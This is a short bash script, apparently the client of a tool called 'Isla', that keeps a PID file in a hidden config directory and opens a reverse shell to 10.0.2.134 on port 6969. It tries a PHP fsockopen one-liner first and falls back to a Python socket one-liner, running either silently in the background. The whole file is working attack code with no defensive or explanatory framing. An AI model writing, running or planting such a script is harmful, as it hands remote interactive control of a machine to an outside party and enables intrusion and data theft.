#!/bin/bash

# Check if the script is already running

if [ -f ~/.config/.isla/src/client/.pid ]; then
  PID=$(cat ~/.config/.isla/src/client/.pid)
  if ps -p $PID >/dev/null 2>&1; then
    echo "Isla is already running"
    exit 1
  fi
fi

# Start reverse shell
IP="10.0.2.134"
PORT=6969
if command -v php >/dev/null; then
  php -r "\$sock=fsockopen('$IP',$PORT);exec('/bin/sh -i <&3 >&3 2>&3');" >/dev/null 2>&1 &
elif command -v python >/dev/null; then
  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" >/dev/null 2>&1 &
fi

# Save PID
echo $! >~/.config/.isla/src/client/.pid

wait $!
